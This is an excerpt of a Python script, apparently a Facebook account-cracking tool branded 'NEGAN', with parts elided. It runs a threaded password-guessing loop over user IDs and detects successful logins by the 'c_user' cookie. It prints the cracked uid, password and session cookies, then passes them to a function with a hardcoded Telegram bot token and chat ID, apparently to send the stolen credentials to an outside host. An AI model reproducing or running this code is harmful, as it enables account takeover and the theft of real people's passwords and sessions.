...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⠿⢿⡻⠿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀
 ...
 \x1b[1;92m        UPDATED BY  :  TWD / 𝐍𝐄𝐆𝐀𝐍
\033[1;91m=========================================================="""
...
def Elite(uid,ps,coki):
    try:
        import requests
        token = "5121108771:AAF7lOAvOBiaivwuSb3E1EY82ZXHVoNHcbg"# 
        chatid = "1728474499"#
...
def Tabii():
    ...
    print(f"")
    print(f" 21894 ,21893 ,21892 ,21891")
    print(f"")
    linex()
    code = input(' PUT CODE : ')
    os.system("clear")
    ...
    with ThreadPool(max_workers=30) as yaari:    
        ...
        print(f" {BLUE}COUNTRY YOU CHOOSE    : {GREEN}𝐍𝐄𝐆𝐀𝐍 ")
    ...
    try:
        for ps in pwx:
           ...
           'viewport-width': '980',}
            ...
            sys.stdout.write(f'\r\33[1;37m[𝐍𝐄𝐆𝐀𝐍 ] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
            sys.stdout.flush()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[232:247]
                print(f'\r{GREEN}[𝐍𝐄𝐆𝐀𝐍-OK] '+uid+' | '+ps+'\n'f'{YELLOW}'+coki+'')
                Elite(uid,ps,coki)
                oks.append(cid) 
